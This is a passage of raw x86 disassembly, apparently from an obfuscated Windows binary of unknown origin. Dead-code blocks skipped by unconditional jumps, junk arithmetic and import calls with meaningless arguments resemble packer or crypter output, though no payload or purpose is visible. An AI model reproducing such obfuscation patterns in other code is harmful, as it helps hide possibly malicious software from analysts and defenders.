  41f8fd:	mov    DWORD PTR [ebp-0xb8],0x1
  41f907:	or     eax,0x7a0d
  41f90c:	mov    ecx,DWORD PTR [ebp-0xb8]
  41f912:	cmp    DWORD PTR ds:0x4228aa,0x0
  41f919:	mov    DWORD PTR ds:0x4228ea,0x1a45
  41f923:	mov    DWORD PTR ds:0x422906,0x738a
  41f92d:	mov    DWORD PTR ds:0x42290a,edx
  41f933:	mov    DWORD PTR ds:0x42295a,0x6016
  41f93d:	jmp    0x41fa40
  41f942:	movzx  eax,BYTE PTR ds:0x422986
  41f949:	mov    DWORD PTR ds:0x422976,ecx
  41f94f:	jae    0x41f996
  41f955:	push   DWORD PTR [ebp-0x10]
  41f958:	push   0x88a2
  41f95d:	push   DWORD PTR [ebp-0x14]
  41f960:	push   0x19f9
  41f965:	push   DWORD PTR [ebp-0x10]
  41f968:	push   0x407d
  41f96d:	push   DWORD PTR [ebp-0x28]
  41f970:	push   0x5ee1
  41f975:	push   0x7b11
  41f97a:	push   DWORD PTR [ebp-0x20]
  41f97d:	push   DWORD PTR [ebp-0x24]
  41f980:	call   DWORD PTR ds:0x42a1b8
  41f986:	mov    DWORD PTR ds:0x4228ce,0x1a48
  41f990:	adc    DWORD PTR ds:0x42290a,ebx
  41f996:	adc    DWORD PTR ds:0x422956,0x4228f2
  41f9a0:	adc    DWORD PTR ds:0x42296a,0x42288e
  41f9aa:	cmp    DWORD PTR ds:0x422996,0x0
  41f9b1:	mov    DWORD PTR ds:0x422926,0x4d3f
  41f9bb:	mov    DWORD PTR ds:0x42299a,0x151a
  41f9c5:	mov    DWORD PTR ds:0x422896,0x407
  41f9cf:	mov    DWORD PTR ds:0x422956,0x35c9
  41f9d9:	jmp    0x41fa40
  41f9de:	mov    eax,ds:0x42296e
  41f9e3:	jne    0x41fa1a
  41f9e9:	push   DWORD PTR [ebp-0x18]
  41f9ec:	call   DWORD PTR ds:0x42a1bc
  41f9f2:	xor    DWORD PTR ds:0x42292e,0x4228d2
  41f9fc:	xor    DWORD PTR ds:0x4229a6,0x7795
  41fa06:	xor    DWORD PTR ds:0x42296e,0x5b89
  41fa10:	add    DWORD PTR ds:0x4228a6,0x3dfd
  41fa1a:	sub    DWORD PTR ds:0x42298e,0x1198
  41fa24:	adc    DWORD PTR ds:0x4228ea,0x422902
  41fa2e:	add    DWORD PTR ds:0x4229c6,0x43e7
  41fa38:	xor    DWORD PTR ds:0x422902,ebx
  41fa3e:	neg    eax
  41fa40:	mov    eax,0x584
  41fa45:	sub    DWORD PTR ds:0x422976,0x422906
  41fa4f:	xor    edx,edx
  41fa51:	div    ecx
  41fa53:	cmp    DWORD PTR ds:0x42288a,0x0
  41fa5a:	mov    ecx,0x7438
  41fa5f:	mov    DWORD PTR ds:0x4229a6,0x7ff6
  41fa69:	mov    ecx,0x49e3
  41fa6e:	mov    DWORD PTR ds:0x42296e,0x37ce
  41fa78:	jmp    0x41fac6
  41fa7d:	mov    DWORD PTR ds:0x4228fa,0x7ac
  41fa87:	jb     0x41fab4
  41fa8d:	push   0x18bc
  41fa92:	call   DWORD PTR ds:0x42a090
  41fa98:	sbb    DWORD PTR ds:0x4228f2,0xcbd
  41faa2:	sbb    ecx,DWORD PTR ds:0x4228e2
  41faa8:	sub    DWORD PTR ds:0x42299e,ecx
  41faae:	and    ecx,DWORD PTR ds:0x4228a6
  41fab4:	or     ecx,0x1fe6
  41faba:	add    DWORD PTR ds:0x4228f6,ebx
  41fac0:	adc    ecx,0x2c1d
  41fac6:	imul   eax,eax,0x51d4
  41facc:	cmp    DWORD PTR ds:0x4228a6,0x0
  41fad3:	mov    DWORD PTR ds:0x4228da,ecx
  41fad9:	movzx  ecx,WORD PTR ds:0x42297e
  41fae0:	mov    DWORD PTR ds:0x422962,ebx
  41fae6:	jmp    0x41fb30
  41faeb:	mov    DWORD PTR ds:0x4228e2,edx
  41faf1:	ja     0x41fb1e
  41faf7:	push   0x4229a2
  41fafc:	push   DWORD PTR [ebp-0x28]
  41faff:	push   DWORD PTR [ebp-0x20]
  41fb02:	call   DWORD PTR ds:0x42a094
  41fb08:	mov    DWORD PTR ds:0x4228a6,0x230b
  41fb12:	not    DWORD PTR ds:0x422976
  41fb18:	sub    DWORD PTR ds:0x422986,edi
  41fb1e:	sub    ecx,DWORD PTR ds:0x422982
  41fb24:	adc    ecx,DWORD PTR ds:0x4229be
  41fb2a:	sub    ecx,DWORD PTR ds:0x4228fe
  41fb30:	mov    ecx,DWORD PTR [ebp-0xbc]
  41fb36:	xor    eax,ecx
  41fb38:	sbb    DWORD PTR ds:0x422892,ebx
  41fb3e:	and    eax,0x4c09
  41fb43:	mov    ecx,DWORD PTR [ebp-0x50]
  41fb46:	and    DWORD PTR ds:0x42296e,0x422982
  41fb50:	xor    edx,edx
  41fb52:	or     DWORD PTR ds:0x422956,0x4802
  41fb5c:	div    ecx
  41fb5e:	add    DWORD PTR ds:0x4229be,0x5f4b
  41fb68:	sub    eax,0x401
  41fb6d:	mov    ecx,DWORD PTR ds:0x4228de
  41fb73:	xor    DWORD PTR ds:0x422996,ecx
  41fb79:	mov    DWORD PTR [ebp-0x90],eax
  41fb7f:	cmp    DWORD PTR ds:0x4228b6,0x0
  41fb86:	mov    DWORD PTR ds:0x4228e6,edx
  41fb8c:	not    ecx
  41fb8e:	movzx  ecx,WORD PTR ds:0x4228d6
  41fb95:	jmp    0x41fbc5
  41fb9a:	not    eax
  41fb9c:	jae    0x41fbb3
  41fba2:	push   DWORD PTR [ebp-0x10]
  41fba5:	call   DWORD PTR ds:0x42a2d0
  41fbab:	add    ecx,edx
  41fbad:	and    edx,0x53dd
  41fbb3:	add    DWORD PTR ds:0x42297e,0x1518
  41fbbd:	and    edx,edx
  41fbbf:	neg    DWORD PTR ds:0x422986
  41fbc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41fbcf:	or     eax,eax
  41fbd1:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41fbd8:	cmp    DWORD PTR ds:0x42298e,0x0
  41fbdf:	mov    DWORD PTR ds:0x422932,0x7de
  41fbe9:	mov    edx,0x2edc
  41fbee:	mov    DWORD PTR ds:0x422946,ebx
  41fbf4:	jmp    0x41fc5b
  41fbf9:	mov    DWORD PTR ds:0x4228b6,0xeb6
  41fc03:	mov    ecx,DWORD PTR ds:0x422912
  41fc09:	ja     0x41fc44
  41fc0f:	push   0x8c9b
  41fc14:	call   DWORD PTR ds:0x42a2d4
  41fc1a:	and    DWORD PTR ds:0x4228aa,0x7f6
  41fc24:	xor    edx,edx
  41fc26:	add    edx,DWORD PTR ds:0x422916
  41fc2c:	add    edx,DWORD PTR ds:0x422922
  41fc32:	mov    DWORD PTR ds:0x422916,edx
  41fc38:	mov    ecx,DWORD PTR ds:0x42297e
  41fc3e:	xor    DWORD PTR ds:0x42294a,ecx
  41fc44:	dec    edx
  41fc45:	sub    DWORD PTR ds:0x422946,0x422986
  41fc4f:	mov    edx,DWORD PTR ds:0x4228aa
  41fc55:	sub    DWORD PTR ds:0x422962,edx
  41fc5b:	mov    DWORD PTR [ebp-0xb4],0x3842
  41fc65:	mov    DWORD PTR ds:0x422906,0x649c
  41fc6f:	mov    eax,DWORD PTR [ebp-0x4c]
  41fc72:	adc    edx,0x487c
  41fc78:	add    eax,DWORD PTR [ebp-0xb4]
  41fc7e:	neg    edx
  41fc80:	xor    eax,0x2e02
  41fc85:	xor    edx,edx
  41fc87:	xor    eax,0x7294
  41fc8c:	dec    ecx
  41fc8d:	imul   eax,eax,0x68f3
  41fc93:	sub    edx,edx
  41fc95:	mov    ecx,DWORD PTR [ebp-0x8c]
  41fc9b:	and    eax,ecx
  41fc9d:	or     edx,0x18d0
  41fca3:	sub    eax,0x2818
  41fca8:	and    DWORD PTR ds:0x4229aa,0x187b
  41fcb2:	mov    DWORD PTR [ebp-0xe8],eax
  41fcb8:	mov    DWORD PTR [ebp-0x70],0x6f89
  41fcbf:	cmp    DWORD PTR ds:0x4229ce,0x0
  41fcc6:	mov    DWORD PTR ds:0x4228d6,0x3c7
  41fcd0:	mov    DWORD PTR ds:0x422942,edi
  41fcd6:	movzx  edx,BYTE PTR ds:0x4228aa
  41fcdd:	jmp    0x41fd2b
  41fce2:	mov    DWORD PTR ds:0x422966,ecx
  41fce8:	jae    0x41fd21
  41fcee:	push   0x8302
  41fcf3:	push   0x7bd4
  41fcf8:	push   0x2714
  41fcfd:	push   DWORD PTR [ebp-0x28]
  41fd00:	push   0x400000
  41fd05:	call   DWORD PTR ds:0x42a2d8
  41fd0b:	add    ecx,0x75a1
  41fd11:	or     edx,DWORD PTR ds:0x42298e
  41fd17:	xor    DWORD PTR ds:0x42289e,0x5495
  41fd21:	adc    ecx,edx
  41fd23:	sbb    ecx,DWORD PTR ds:0x422992
  41fd29:	not    edx
  41fd2b:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41fd35:	adc    DWORD PTR ds:0x4228da,0x189a
  41fd3f:	mov    DWORD PTR [ebp-0x120],0x3c77
  41fd49:	cmp    DWORD PTR ds:0x4229d2,0x0
  41fd50:	mov    DWORD PTR ds:0x422962,0x782b
  41fd5a:	mov    edx,0x3512
  41fd5f:	jmp    0x41fda2
  41fd64:	mov    DWORD PTR ds:0x422966,0x45e0
  41fd6e:	mov    DWORD PTR ds:0x42298a,ebx
  41fd74:	jle    0x41fd93
  41fd7a:	push   0x4f01
  41fd7f:	call   DWORD PTR ds:0x42a2dc
  41fd85:	or     edx,ecx
  41fd87:	adc    edx,DWORD PTR ds:0x4228fa
  41fd8d:	sub    DWORD PTR ds:0x422956,edi
  41fd93:	dec    ecx
  41fd94:	inc    DWORD PTR ds:0x4228c2
  41fd9a:	adc    ecx,ecx
  41fd9c:	sub    edx,0x2d38
  41fda2:	mov    DWORD PTR [ebp-0x2c],0x2129
  41fda9:	movzx  edx,WORD PTR ds:0x42290e
  41fdb0:	sbb    edx,DWORD PTR ds:0x4229a6
  41fdb6:	mov    DWORD PTR ds:0x42290e,edx
  41fdbc:	mov    eax,DWORD PTR [ebp-0x2c]
  41fdbf:	imul   eax,eax,0x1ada
  41fdc5:	mov    ecx,DWORD PTR [ebp-0x120]
  41fdcb:	and    DWORD PTR ds:0x422892,ebx
  41fdd1:	imul   ecx,ecx,0x53ae
  41fdd7:	sbb    edx,DWORD PTR ds:0x422982
  41fddd:	imul   ecx,ecx,0x7447
  41fde3:	mov    edx,DWORD PTR [ebp-0xd0]
  41fde9:	inc    DWORD PTR ds:0x4228be
  41fdef:	and    ecx,edx
  41fdf1:	sub    edx,DWORD PTR ds:0x4229a6
  41fdf7:	or     ecx,0x2a20
  41fdfd:	cmp    DWORD PTR ds:0x4228ba,0x0
  41fe04:	mov    DWORD PTR ds:0x422906,edi
  41fe0a:	mov    DWORD PTR ds:0x4229d2,edx
  41fe10:	mov    DWORD PTR ds:0x4228be,edx
  41fe16:	mov    edx,DWORD PTR ds:0x422956
  41fe1c:	jmp    0x41fea5
  41fe21:	mov    DWORD PTR ds:0x4228ba,0x5711
  41fe2b:	mov    DWORD PTR ds:0x4228ba,edi
  41fe31:	ja     0x41fe6b
  41fe37:	push   0x3098
  41fe3c:	push   0x4227d9
  41fe41:	push   0x4227af
  41fe46:	push   0x4227eb
  41fe4b:	call   DWORD PTR ds:0x42a1c0
  41fe51:	mov    edx,DWORD PTR ds:0x4229ae
  41fe57:	adc    edx,DWORD PTR ds:0x4228c6
  41fe5d:	mov    DWORD PTR ds:0x4229ae,edx
  41fe63:	not    edx
  41fe65:	xor    edx,DWORD PTR ds:0x422996
  41fe6b:	mov    edx,DWORD PTR ds:0x422af2
  41fe71:	mov    edx,DWORD PTR [edx]
  41fe73:	add    DWORD PTR ds:0x422936,edx
  41fe79:	mov    edx,DWORD PTR ds:0x422892
  41fe7f:	and    DWORD PTR ds:0x422976,edx
  41fe85:	movzx  edx,WORD PTR ds:0x4229ae
  41fe8c:	add    DWORD PTR ds:0x4229d2,edx
  41fe92:	movzx  edx,WORD PTR ds:0x4229aa
  41fe99:	xor    edx,DWORD PTR ds:0x42289a
  41fe9f:	mov    DWORD PTR ds:0x4229aa,edx
  41fea5:	mov    edx,DWORD PTR [ebp-0x70]
  41fea8:	xor    ecx,edx
  41feaa:	add    DWORD PTR ds:0x4228ae,0x42293e
  41feb4:	mov    edx,DWORD PTR [ebp+0x14]
  41feb7:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41febe:	add    DWORD PTR ds:0x422986,0x422936
  41fec8:	lea    eax,[ecx+eax*1-0x45a1]
  41fecf:	sub    ecx,0x1147
  41fed5:	mov    DWORD PTR [ebp-0xb0],eax
  41fedb:	mov    DWORD PTR [ebp-0x11c],0x303f
  41fee5:	mov    DWORD PTR [ebp-0x98],0x51a9
  41feef:	and    DWORD PTR ds:0x4228ee,0x28c
  41fef9:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41ff03:	mov    eax,DWORD PTR [ebp-0xcc]
  41ff09:	xor    eax,0x6f65
  41ff0e:	movzx  ecx,WORD PTR ds:0x42296a
  41ff15:	or     DWORD PTR ds:0x422986,ecx
  41ff1b:	mov    ecx,DWORD PTR [ebp-0x98]
  41ff21:	or     eax,ecx
  41ff23:	xor    DWORD PTR ds:0x422922,0x9d1
  41ff2d:	add    eax,0x161e
  41ff32:	mov    ecx,DWORD PTR [ebp-0x11c]
  41ff38:	add    DWORD PTR ds:0x422996,0x5a44
  41ff42:	or     eax,ecx
  41ff44:	and    DWORD PTR ds:0x422922,ebx
  41ff4a:	add    eax,0x1cca
  41ff4f:	cmp    DWORD PTR ds:0x422996,0x0
  41ff56:	movzx  ecx,WORD PTR ds:0x4229b6
  41ff5d:	mov    DWORD PTR ds:0x4228ca,ecx
  41ff63:	mov    ecx,0x6e0d
  41ff68:	jmp    0x41ffdc
  41ff6d:	mov    ecx,0x4420
  41ff72:	mov    DWORD PTR ds:0x4228d2,0xbd6
  41ff7c:	jb     0x41ffc6
  41ff82:	push   DWORD PTR [ebp-0x14]
  41ff85:	push   DWORD PTR [ebp-0x24]
  41ff88:	push   0x422797
  41ff8d:	push   0x81c6
  41ff92:	push   0x5863
  41ff97:	push   0x7a14
  41ff9c:	push   DWORD PTR [ebp-0x14]
  41ff9f:	push   0x36c1
  41ffa4:	call   DWORD PTR ds:0x42a1c4
  41ffaa:	mov    ecx,DWORD PTR ds:0x4229b6
  41ffb0:	add    DWORD PTR ds:0x4228da,ecx
  41ffb6:	add    DWORD PTR ds:0x42288e,0x26c4
  41ffc0:	add    ecx,0x5f2e
  41ffc6:	sbb    DWORD PTR ds:0x422972,edi
  41ffcc:	add    DWORD PTR ds:0x42289e,edx
  41ffd2:	sbb    DWORD PTR ds:0x4228a2,0x42293e
  41ffdc:	xor    eax,0x96c9
  41ffe1:	mov    DWORD PTR [ebp-0x38],eax
  41ffe4:	mov    DWORD PTR [ebp-0x118],0x6083
  41ffee:	sbb    ecx,0x49d9
  41fff4:	mov    DWORD PTR [ebp-0x88],0x556
  41fffe:	mov    DWORD PTR [ebp-0x140],0x6c7d
  420008:	mov    eax,DWORD PTR [ebp-0x140]
  42000e:	cmp    DWORD PTR ds:0x42297e,0x0
  420015:	mov    DWORD PTR ds:0x4229ba,0x1d24
  42001f:	mov    ecx,DWORD PTR ds:0x42293e
  420025:	movzx  ecx,WORD PTR ds:0x422986
  42002c:	jmp    0x420068
  420031:	mov    DWORD PTR ds:0x4228be,0x28a1
  42003b:	je     0x42005c
  420041:	push   DWORD PTR [ebp-0x18]
  420044:	call   DWORD PTR ds:0x42a2e0
  42004a:	add    DWORD PTR ds:0x4228ce,edi
  420050:	and    DWORD PTR ds:0x4228ce,ebx
  420056:	add    ecx,0x4241
  42005c:	xor    ecx,0x765e
  420062:	sub    DWORD PTR ds:0x4229d2,edi
  420068:	add    eax,0x5af8
  42006d:	mov    ecx,DWORD PTR [ebp-0x88]
  420073:	xor    DWORD PTR ds:0x4229c2,0x1fa8
  42007d:	sub    eax,ecx
  42007f:	cmp    DWORD PTR ds:0x4229d2,0x0
  420086:	mov    ecx,0x1395
  42008b:	mov    ecx,DWORD PTR ds:0x4228e6
  420091:	mov    DWORD PTR ds:0x4228f2,ebx
  420097:	jmp    0x420101
  42009c:	mov    DWORD PTR ds:0x422972,0x6a84
  4200a6:	mov    DWORD PTR ds:0x4228ea,0x62f2
  4200b0:	jb     0x4200da
  4200b6:	push   0x3346
  4200bb:	call   DWORD PTR ds:0x42a1c8
  4200c1:	add    ecx,0x6b03
  4200c7:	movzx  ecx,WORD PTR ds:0x422912
  4200ce:	add    DWORD PTR ds:0x42288a,ecx
  4200d4:	and    ecx,DWORD PTR ds:0x42292e
  4200da:	sub    DWORD PTR ds:0x422936,edi
  4200e0:	xor    ecx,ecx
  4200e2:	xor    ecx,DWORD PTR ds:0x422962
  4200e8:	add    ecx,DWORD PTR ds:0x422966
  4200ee:	mov    DWORD PTR ds:0x422962,ecx
  4200f4:	movzx  ecx,WORD PTR ds:0x42290e
  4200fb:	or     DWORD PTR ds:0x42294a,ecx
  420101:	mov    ecx,DWORD PTR [ebp-0x118]
  420107:	xor    DWORD PTR ds:0x4228ca,0x60cf
  420111:	lea    eax,[eax+ecx*1+0x68dc]
  420118:	not    ecx
  42011a:	or     eax,0x52f6
  42011f:	xor    ecx,0x5502
  420125:	sub    eax,0x1dbfe
  42012a:	and    DWORD PTR ds:0x4228ee,0x5b35
  420134:	mov    DWORD PTR [ebp-0xac],eax
  42013a:	add    DWORD PTR ds:0x422976,0x4861
  420144:	mov    DWORD PTR [ebp-0x6c],0x4b56
  42014b:	mov    DWORD PTR [ebp-0x100],0x49f7
  420155:	mov    eax,DWORD PTR [ebp-0x100]
  42015b:	and    ecx,0x658f
  420161:	add    eax,0x7b60
  420166:	imul   eax,eax,0x5ea
  42016c:	mov    ecx,DWORD PTR [ebp-0x6c]
  42016f:	and    DWORD PTR ds:0x42292e,0x4229c6
  420179:	imul   eax,ecx
  42017c:	xor    edx,edx
  42017e:	and    DWORD PTR ds:0x42299a,ecx
  420184:	mov    ecx,0x3218d
  420189:	div    ecx
  42018b:	adc    DWORD PTR ds:0x42293a,0x4228f2
  420195:	sub    eax,0x24c1
  42019a:	cmp    DWORD PTR ds:0x42296e,0x0
  4201a1:	mov    DWORD PTR ds:0x4228f6,0x5f97
  4201ab:	mov    ecx,DWORD PTR ds:0x422992
  4201b1:	jmp    0x4201fd
  4201b6:	mov    DWORD PTR ds:0x42290e,0x3c76
  4201c0:	not    DWORD PTR ds:0x4228ae
  4201c6:	jbe    0x4201ed
  4201cc:	push   0x3dff
  4201d1:	call   DWORD PTR ds:0x42a098
  4201d7:	not    ecx
  4201d9:	add    DWORD PTR ds:0x4229ca,0x7a9c
  4201e3:	and    DWORD PTR ds:0x422906,0x510
  4201ed:	xor    DWORD PTR ds:0x4228ae,ebx
  4201f3:	adc    DWORD PTR ds:0x422902,0x422986
  4201fd:	mov    DWORD PTR [ebp-0xa8],eax
  420203:	cmp    DWORD PTR ds:0x422916,0x0
  42020a:	mov    ecx,0x7594
  42020f:	mov    ecx,0x61a
  420214:	movzx  ecx,WORD PTR ds:0x4229c6
  42021b:	jmp    0x420273
  420220:	mov    eax,ds:0x42294a
  420225:	mov    DWORD PTR ds:0x4228f6,edi
  42022b:	jbe    0x42025f
  420231:	push   0x1
  420233:	push   0x158d
  420238:	push   DWORD PTR [ebp-0x14]
  42023b:	push   0x1baf
  420240:	call   DWORD PTR ds:0x42a2e4
  420246:	add    ecx,0x4150
  42024c:	adc    ecx,0x4614
  420252:	movzx  ecx,BYTE PTR ds:0x422892
  420259:	and    DWORD PTR ds:0x4228a2,ecx
  42025f:	sub    ecx,ecx
  420261:	mov    ecx,DWORD PTR ds:0x42289e
  420267:	add    ecx,DWORD PTR ds:0x42298a
  42026d:	mov    DWORD PTR ds:0x42289e,ecx
  420273:	mov    DWORD PTR [ebp-0x84],0x2c40
  42027d:	mov    DWORD PTR [ebp-0x18],0x6013
  420284:	mov    DWORD PTR [ebp-0x80],0xc
  42028b:	xor    ecx,ecx
  42028d:	add    ecx,DWORD PTR ds:0x4228be
  420293:	add    DWORD PTR ds:0x4229ce,ecx
  420299:	mov    eax,DWORD PTR [ebp-0x18]
  42029c:	or     ecx,DWORD PTR ds:0x42296a
  4202a2:	mov    ecx,DWORD PTR [ebp-0x80]
  4202a5:	xor    DWORD PTR ds:0x422912,0x4229b6
  4202af:	xor    edx,edx
  4202b1:	div    ecx
  4202b3:	sub    ecx,DWORD PTR ds:0x42288a
  4202b9:	imul   eax,eax,0x4312
  4202bf:	cmp    DWORD PTR ds:0x42290a,0x0
  4202c6:	mov    DWORD PTR ds:0x42289a,0x25f4
  4202d0:	mov    DWORD PTR ds:0x4228de,0x6ae8
  4202da:	mov    DWORD PTR ds:0x422936,0x199e
  4202e4:	jmp    0x4203b7
  4202e9:	mov    DWORD PTR ds:0x4228e6,0x15fd
  4202f3:	jb     0x42032d
  4202f9:	push   0x42293a
  4202fe:	push   0x1346
  420303:	push   DWORD PTR [ebp-0x18]
  420306:	push   0x747f
  42030b:	call   DWORD PTR ds:0x42a1cc
  420311:	and    ecx,DWORD PTR ds:0x42299a
  420317:	mov    ecx,DWORD PTR ds:0x42288a
  42031d:	xor    DWORD PTR ds:0x4229ca,ecx
  420323:	sbb    DWORD PTR ds:0x422926,0xf78
  42032d:	not    DWORD PTR ds:0x4228ca
  420333:	adc    DWORD PTR ds:0x422972,ebx
  420339:	cmp    DWORD PTR ds:0x4228f2,0x0
  420340:	mov    DWORD PTR ds:0x4229b2,0x21f7
  42034a:	mov    DWORD PTR ds:0x4229a6,ebx
  420350:	mov    DWORD PTR ds:0x4228aa,0x33dc
  42035a:	jmp    0x4203b7
  42035f:	mov    DWORD PTR ds:0x42288a,0x359f
  420369:	mov    DWORD PTR ds:0x42297a,0x36a8
  420373:	je     0x42039b
  420379:	call   DWORD PTR ds:0x42a2e8
  42037f:	or     ecx,0xc82
  420385:	adc    DWORD PTR ds:0x4229ce,0x7856
  42038f:	neg    DWORD PTR ds:0x4228e6
  420395:	sub    ecx,0x6a4f
  42039b:	or     ecx,DWORD PTR ds:0x42290e
  4203a1:	adc    ecx,DWORD PTR ds:0x422906
  4203a7:	xor    DWORD PTR ds:0x42290a,0x3a36
  4203b1:	adc    ecx,DWORD PTR ds:0x422972
  4203b7:	add    eax,0x5abe
  4203bc:	dec    ecx
  4203bd:	mov    ecx,DWORD PTR [ebp-0x84]
  4203c3:	sbb    DWORD PTR ds:0x4228ba,0x6729
  4203cd:	xor    eax,ecx
  4203cf:	movzx  ecx,WORD PTR ds:0x42288e
  4203d6:	sub    ecx,DWORD PTR ds:0x4228ce
  4203dc:	mov    DWORD PTR ds:0x42288e,ecx
  4203e2:	xor    edx,edx
  4203e4:	mov    ecx,0x5ae
  4203e9:	div    ecx
  4203eb:	and    DWORD PTR ds:0x42289e,ebx
  4203f1:	xor    eax,0x5e8c
  4203f6:	mov    DWORD PTR [ebp-0x48],eax
  4203f9:	mov    DWORD PTR ds:0x4228ae,0x2632
  420403:	mov    DWORD PTR [ebp-0x13c],0x7b18
  42040d:	and    eax,DWORD PTR ds:0x42291e
  420413:	mov    DWORD PTR [ebp-0x138],0x1169
  42041d:	xor    eax,ecx
  42041f:	mov    DWORD PTR [ebp-0x12c],0x1379
  420429:	mov    eax,DWORD PTR [ebp-0x12c]
  42042f:	mov    ecx,0x5856
  420434:	or     DWORD PTR ds:0x422922,0x661e
  42043e:	sub    ecx,eax
  420440:	dec    eax
  420441:	shr    ecx,0x2
  420444:	sub    ecx,0x5be6
  42044a:	cmp    DWORD PTR ds:0x42291e,0x0
  420451:	mov    DWORD PTR ds:0x422906,0x5702
  42045b:	mov    DWORD PTR ds:0x4228b2,0x24ef
  420465:	jmp    0x4204c4
  42046a:	mov    eax,ds:0x4228c6
  42046f:	not    DWORD PTR ds:0x42296e
  420475:	jl     0x4204a8
  42047b:	push   0x5bb1
  420480:	push   0x4228e2
  420485:	push   0x2dbc
  42048a:	call   DWORD PTR ds:0x42a09c
  420490:	add    DWORD PTR ds:0x422996,edx
  420496:	sub    DWORD PTR ds:0x4228d2,ecx
  42049c:	and    DWORD PTR ds:0x4228ae,ebx
  4204a2:	adc    DWORD PTR ds:0x42299e,edi
  4204a8:	adc    DWORD PTR ds:0x4229be,edi
  4204ae:	add    DWORD PTR ds:0x42294a,edi
  4204b4:	add    DWORD PTR ds:0x4228da,0x3429
  4204be:	sub    DWORD PTR ds:0x42296e,ecx
  4204c4:	mov    eax,DWORD PTR [ebp-0x138]
  4204ca:	imul   ecx,eax
  4204cd:	xor    DWORD PTR ds:0x4229aa,ebx
  4204d3:	mov    eax,DWORD PTR [ebp-0x13c]
  4204d9:	xor    DWORD PTR ds:0x42298e,0x5901
  4204e3:	and    ecx,eax
  4204e5:	mov    eax,0x3b18
  4204ea:	and    DWORD PTR ds:0x4228b6,0x42293e
  4204f4:	sub    eax,ecx
  4204f6:	or     DWORD PTR ds:0x4228ee,0x4ab5
  420500:	mov    DWORD PTR [ebp-0xfc],eax
  420506:	mov    ecx,DWORD PTR ds:0x4228aa
  42050c:	sbb    DWORD PTR ds:0x42288a,ecx
  420512:	mov    DWORD PTR [ebp-0x28],0x16d7
  420519:	xor    eax,eax
  42051b:	mov    DWORD PTR [ebp-0x134],0x6b4
  420525:	xor    eax,eax
  420527:	mov    eax,DWORD PTR [ebp-0x134]
  42052d:	add    ecx,DWORD PTR ds:0x42289a
  420533:	or     eax,0x4f70
  420538:	mov    ecx,DWORD PTR [ebp-0x28]
  42053b:	sub    DWORD PTR ds:0x4229ca,0x4228aa
  420545:	or     eax,ecx
  420547:	and    DWORD PTR ds:0x4228ba,ebx
  42054d:	sub    eax,0x5ff7
  420552:	mov    ecx,DWORD PTR ds:0x422a82
  420558:	mov    ecx,DWORD PTR [ecx]
  42055a:	adc    DWORD PTR ds:0x42294e,ecx
  420560:	mov    DWORD PTR [ebp-0xc8],eax
  420566:	mov    DWORD PTR [ebp-0xe4],0x5f39
  420570:	mov    DWORD PTR [ebp-0xc4],0x6236
  42057a:	not    eax
  42057c:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  420583:	or     eax,DWORD PTR ds:0x42289a
  420589:	mov    DWORD PTR [ebp-0x128],0x7537
  420593:	mov    DWORD PTR [ebp-0x114],0x6985
  42059d:	mov    DWORD PTR [ebp-0x14],0x5627
  4205a4:	mov    DWORD PTR [ebp-0x64],0x72e7
  4205ab:	not    DWORD PTR ds:0x42293a
  4205b1:	mov    eax,DWORD PTR [ebp-0x14]
  4205b4:	cmp    DWORD PTR ds:0x4228be,0x0
  4205bb:	mov    DWORD PTR ds:0x4228c2,edx
  4205c1:	mov    DWORD PTR ds:0x42299e,0x4cb1
  4205cb:	movzx  ecx,WORD PTR ds:0x4228a2
  4205d2:	jmp    0x420682
  4205d7:	mov    DWORD PTR ds:0x4228e2,0x2b18
  4205e1:	jl     0x420612
  4205e7:	push   DWORD PTR [ebp-0x28]
  4205ea:	push   0x68d6
  4205ef:	push   0x1f9a
  4205f4:	push   0x3f36
  4205f9:	push   DWORD PTR [ebp-0x14]
  4205fc:	call   DWORD PTR ds:0x42a1d0
  420602:	and    DWORD PTR ds:0x422972,edi
  420608:	sub    DWORD PTR ds:0x4229a6,0x3838
  420612:	sub    DWORD PTR ds:0x422926,0x422946
  42061c:	sub    DWORD PTR ds:0x42288e,edi
  420622:	inc    ecx
  420623:	cmp    DWORD PTR ds:0x4228da,0x0
  42062a:	mov    DWORD PTR ds:0x422916,edi
  420630:	mov    DWORD PTR ds:0x4228c2,0x3e4f
  42063a:	mov    ecx,0x124e
  42063f:	jmp    0x420682
  420644:	movzx  ecx,WORD PTR ds:0x4228fa
  42064b:	jg     0x420670
  420651:	push   0x110e
  420656:	call   DWORD PTR ds:0x42a1d4
  42065c:	mov    ecx,DWORD PTR ds:0x42292e
  420662:	sub    DWORD PTR ds:0x4229ba,ecx
  420668:	not    ecx
  42066a:	sub    ecx,0x3ff2
  420670:	sbb    DWORD PTR ds:0x4229b2,ecx
  420676:	mov    ecx,DWORD PTR ds:0x4229ba
  42067c:	or     DWORD PTR ds:0x422996,ecx
  420682:	add    eax,DWORD PTR [ebp-0x64]
  420685:	cmp    DWORD PTR ds:0x42296a,0x0
  42068c:	mov    DWORD PTR ds:0x4229b6,edx
  420692:	mov    DWORD PTR ds:0x4228ce,0x892
  42069c:	mov    DWORD PTR ds:0x42295a,0x70ff
  4206a6:	mov    DWORD PTR ds:0x42292e,edi
  4206ac:	jmp    0x420711
  4206b1:	mov    DWORD PTR ds:0x4228ea,0x2b24
  4206bb:	jge    0x4206ef
  4206c1:	call   DWORD PTR ds:0x42a2ec
  4206c7:	xor    DWORD PTR ds:0x4229ce,ebx
  4206cd:	mov    ecx,DWORD PTR ds:0x422902
  4206d3:	or     ecx,DWORD PTR ds:0x422976
  4206d9:	mov    DWORD PTR ds:0x422902,ecx
  4206df:	and    ecx,DWORD PTR ds:0x42293e
  4206e5:	sub    DWORD PTR ds:0x4228fe,0x422922
  4206ef:	add    DWORD PTR ds:0x422952,ecx
  4206f5:	and    ecx,DWORD PTR ds:0x4228c6
  4206fb:	adc    ecx,DWORD PTR ds:0x42290e
  420701:	sub    ecx,DWORD PTR ds:0x4228a2
  420707:	and    DWORD PTR ds:0x42295e,0x60c
  420711:	mov    ecx,DWORD PTR [ebp-0x114]
  420717:	sub    DWORD PTR ds:0x4229ba,0x175
  420721:	sub    eax,ecx
  420723:	mov    ecx,DWORD PTR [ebp-0x128]
  420729:	and    DWORD PTR ds:0x42288e,0x7a1c
  420733:	imul   eax,ecx
  420736:	imul   eax,eax,0xe4e
  42073c:	neg    ecx
